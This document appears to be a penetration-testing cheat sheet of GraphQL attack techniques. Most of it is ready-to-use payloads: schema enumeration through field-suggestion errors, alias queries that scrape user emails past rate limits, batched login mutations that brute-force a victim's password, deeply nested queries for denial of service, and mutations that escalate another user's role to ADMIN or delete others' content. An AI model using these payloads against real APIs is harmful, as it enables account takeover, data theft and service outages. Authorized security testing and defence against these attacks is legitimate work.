# GraphQL Advanced Techniques

## Field Suggestion Attack (When Introspection Disabled)

Send queries with intentionally misspelled fields. Many implementations respond with "Did you mean 'X'?" suggestions:

```json
{"query":"{ usrs { id } }"}
Response: "Cannot query field 'usrs' on type 'Query'. Did you mean 'users'?"
```

Systematically map the schema:
```bash
# Start broad
echo "{ a { id } }" → "Did you mean 'account', 'admin', 'article'?"
echo "{ b { id } }" → "Did you mean 'billing', 'blog'?"
echo "{ u { id } }" → "Did you mean 'user', 'userProfile'?"

# Then enumerate each discovered type
echo "{ user(x: 1) { y } }" → error reveals valid argument names and field names
```

Tool: `clairvoyance` automates this process.

## Alias-Based Enumeration (Rate Limit Bypass)

```graphql
query MassEnum {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  ... u1000: user(id: "1000") { email }
}
```

One HTTP request = 1000 authorization checks. If each individual query is allowed but no per-query rate limit exists → mass data extraction.

## Batching Attack

Some GraphQL implementations accept an array of operations:
```json
[
  {"query": "mutation { login(email: \"victim@test.com\", pwd: \"a\") { token } }"},
  {"query": "mutation { login(email: \"victim@test.com\", pwd: \"b\") { token } }"},
  {"query": "mutation { login(email: \"victim@test.com\", pwd: \"c\") { token } }"}
]
```
Per-request rate limit (e.g., 10 login attempts per minute) is bypassed because all 100 attempts are in ONE request.

## Nested Query DoS Pattern

When types have relationships that reference each other:
```
type User { posts: [Post] }
type Post { author: User }
```

Deep recursive queries cause exponential resolver calls:
```graphql
query DoS {
  users { 
    posts { 
      author { 
        posts { 
          author { 
            posts { author { posts { id } } } 
          } 
        } 
      } 
    } 
  }
}
```

Depth 3 = 100 operations, depth 5 = 10,000 operations, depth 7 = 1,000,000 operations.

**Test incrementally.** Start at depth 3, observe response time, add depth only if the pattern is safe. NEVER go deep enough to crash the server.

## Mutation Authorization Bypass

Test each mutation with manipulated arguments:
```graphql
mutation { 
  updateUser(id: "ANOTHER_USER_ID", input: { role: "ADMIN", email: "attacker@test.com" }) { 
    id role 
  } 
}

mutation { 
  deletePost(id: "SOMEONE_ELSES_POST") { 
    success 
  } 
}

mutation {
  createInvite(organizationId: "TARGET_ORG") {
    token
  }
}
```

## Introspection via Persisted Queries

Some servers disable introspection on the main endpoint but still accept it via persisted queries or alternative endpoints:
```
/graphql (blocks introspection)
/graphql/v1 (may allow)
/api/graphql (may allow)
/graphql?introspection=true
```
